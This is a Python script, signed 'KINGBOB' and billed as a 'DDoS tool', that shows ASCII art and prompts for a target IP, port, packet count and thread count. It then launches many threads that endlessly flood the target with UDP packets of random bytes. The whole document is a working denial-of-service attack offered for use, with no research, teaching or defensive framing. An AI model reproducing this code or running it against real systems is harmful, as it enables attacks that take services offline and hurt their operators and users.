#Author By kingbob
#CODED BY KINGBOB
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print("""
...................................^~!?Y5PB##&&@@@@@@&&##BP5Y?!~^...................................
.............................:~7YPB&&@@@@@@@@@@@@@@@@@@@@@@@@@@@&BPJ7~:.............................
.........................:!JG#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#GJ!:.........................
......................~?P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&P?~......................
...................~JB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BJ~...................
................:7G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G7:................
..............^Y#@@@@@@@@@@@@@@@@@@@@@@@@&&&&##########&&&&@@@@@@@@@@@@@@@@@@@@@@@@#Y^..............
............^Y&@@@@@@@@&@@@@@@@@@@@&&######BBBBBBBBBBBBBBB#####&&@@@@@@@@@@B#@@@@@@@@&Y^............
..........:J&@@@@@@B57?G@@@@@@@@&###&&&&##&&&##&@#B@&##&&&##&&&&###&@@@@@@@#Y~!JG@@@@@@&J:..........
.........!#@@@@@#J^ .Y&@@@@@@#BB#&@@@###@@@&#&@@@#B@@@&#&@@@###@@@&#BB#@@@@@@#!  :J&&#@@@#!.........
.......:5@@&5YBJ.  7#@@@@@&#B#&##&&#B&@@@@&#@@@@@##@@@@@#&@@@@&B#&&&#&#B#&@@@@@P^  :5P!Y&@@5:.......
......^B@@Y.~#!  ^5B@@@@&##&@@@@@#B##&&&&&B&@@@G55??YB@@&B&&&&&##B#@@@@@&##&@@@#G5^  PB .5@@B~......
.....!&@&! .#Y !PB75@@&#B&@@@@@@&B&@@@@&&B&&&&J ~BG^  Y&&&B&&@@@@&B&@@@@@@&B#&@@77G5~.#J  J&@@!.....
....!@BBY  ?@YP5~.J@@&B#@@@@@@@#B@@@@@@@##@@@@G?Y##~  P@@@##@@@@@@@B#@@@@@@@#B#@&! ^JYG@:  BYG@7....
...!@5~@! .BP!  ~G@@#B##&@@@@@#B@@@@@@@&B@@@@@@@@#7^JB@@@@@B&@@@@@@@B#@@@@@&##B#@@G~  ^5Y  PB 5@!...
..^&P !@! 7~ .7P@@@#B@@&&#####B&@@@@@@@##@@@@@@@@PJ@@@@@@@@##@@@@@@@&B#####&&@@BB@@&5J^ ^^ P#  B&^..
..G@: ^@? .~5G?G@@#B@@@@@@@@&B#&#######B#&&&&&&&&55&&&&&&&&#B#######&#B&@@@@@@@@B#@@J!GG7. #P  !@G..
.7@B  .#J^GG! 7@@#B&@@@@@@@@&B@@@@@@@@&B&&&&&&&&?  ?&&&&&&&&B&@@@@@@@@B#@@@@@@@@@B#@@~ ~5G7BJ  .&@7.
.B@B   P#P~  7@@@B#@@@@@@@@@B&@@@@@@@@&#@@@@@@@@&YY#@@@@@@@@##@@@@@@@@&B@@@@@@@@@#B&@@?  :Y@J  :&@B:
!@P&:  5Y  .5@@@#B@@@@@@@@@&B@@@@@@@@@#&@@@@@@@@@#B@@@@@@@@@##@@@@@@@@@B&@@@@@@@@@B#@@@P^  ??  ?&?@7
PB^@P  7  !#Y@@@B#@@@@@@@@@#B@@@@@@@@@#&@@@@@@&GY??YG&@@@@@@&#@@@@@@@@@B#@@@@@@@@@#B@@#?&J  ~ :&B BP
#Y 5@J . 5@?!@@@B#@@@@@@@@@##@@@@@@@@@#&@@#Y7##?~??~?##7Y#@@@#@@@@@@@@@##@@@@@@@@@#B@@@^!@B: .B@! P&
@Y .G@~ G&~ 5@@&B##########BB###&&###BG5J!. ~@@@G^^P@@@~ .!J5GB###&&###BB##########B&@@Y :B&:J@J  P@
@B  .BBP#: .#@@@B#@@@@@@@@@##@@&Y?7~^:.    .B@@B5!!5B@@B.    .:^~7?Y&@@##@@@@@@@@@#B@@@&: .GB#Y  :&@
@@!  :#@^  J@@@@B#@@@@@@@@@&B@@J           :&@@&@~~@&@@&:           ?@@B&@@@@@@@@@#B@@@@Y  .#P   Y@@
#@B.  75  ^&G@@@#B@@@@@@@@@&B@#.           .#@@@B  B@@@#.           .#@B&@@@@@@@@@B#@@@J&~  J^  7&B#
PYB#^ .!  P@^G@@@B#@@@@@@@@@B&J             J@@@J  J@@@J             ?&B@@@@@@@@@#B@@@Y.@B. ~ .J@JJP
75.G@Y.. !@G 7@@@&B&@@@@@@@@&G:             .B@@!  !@@B.             :G&@@@@@@@@&B&@@@^ P@7 .!#@7 G7
:G^ 7#&? Y@! :&@@@#B&@@@@@@&&Y               :B@!  ~@B:               Y&&@@@@@@&B#@@@#. !@?:P@5: ?B:
.?B.  ?#G5&.  B&@@@#B&@&###&&~                .5!  ^5.                ~&&###&@&B#@@&&G  :@GB5:  7@?.
..G#~   7B@:  5#?&@@#BB&@@@@#.                                        .#@@@@&BB#@@G!&Y  ~@5:  .5@G..
..^&@5~   JJ  ?@7.P@@&B#@@@@5                                          5@@@@#B&@@? J@7  J~  :JG@&^..
...!#Y#G?. ^^ ^@G  Y@@@#B#@@7                                          7@@#B#@@@7  #@: :. !P&5J&!...
....7G~?B&P7^  P@^  Y@@@@#B#:                                          :#B#@@@@?  ~@J :7P##Y^!#7....
.....7B7 ^JGBGJ!B5  .B##@@@G                                            G@@@GBP   GB?PBGJ^ .5&!.....
......~BB~  .^?5G@J  ^#J!P@#.                                          .B&Y^Y#: .5#5?~.  :J&#~......
.......:P@B?^    ^??^ !@? ^YP^                                        ^5J. Y&~ ^7~    :7P@@5:.......
.........7#@B5J7^. .^: ^B5  :??:                                    :7!. .5G: ::.:~?YPPB@#7.........
..........:J#GJJPGGGP5YJ?B#?: .!!^.                              .^~^. ^J#BJYPPGGGPJ7?G&Y:..........
............^5#5!:..^^~~~!7?7~:. .:                              .. .:^!~^^^::..  ^?B&5^............
..............^Y#&GJ!^:..  .:^~7J5~                              !G5Y?!^^:::^~!?5#@&Y^..............
................:?B@&GPPGBB####GY7.                              .~?5GB###BGP5P#@G?:................
...................~JGPJ!^::..                                          .:^!YGGJ~...................
......................~JPBGPYJJJ57                                JG555PG##GJ~......................
.........................^!YG&@@@?                                ?@@@&GY!^.........................
.............................:~7Y:                                :Y7~:.............................
........................................                    ........................................
""")

print("KINGBOB DDoS+")
print("WELCOME TO KINGBOB DDOS TOOL")
print("Tools By KINGBOB")
ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[94mMethods UDP: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
def run():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KINGBOB ")
		except:
			print("[!] KINGBOB AS SENT")
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KINGBOB ")
		except:
			print("[!] KINGBOB AS SENT")
			
def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KINGBOB ")
		except:
			print("[!] KINGBOB AS SENT")
for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()